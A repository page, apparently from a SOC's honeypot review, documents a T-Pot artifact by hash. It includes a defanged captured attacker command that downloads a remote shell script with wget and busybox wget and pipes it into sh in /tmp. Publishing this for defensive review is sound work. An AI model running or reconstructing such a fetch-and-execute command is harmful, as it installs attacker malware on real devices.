# ed0e01eef7effa81915b7c37d959241076993f837547c5bb86b6153d9844edc7

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `ed0e01eef7effa81915b7c37d959241076993f837547c5bb86b6153d9844edc7` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
{"cmd":"`cd /tmp;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s 9router;busybox wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s 9
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
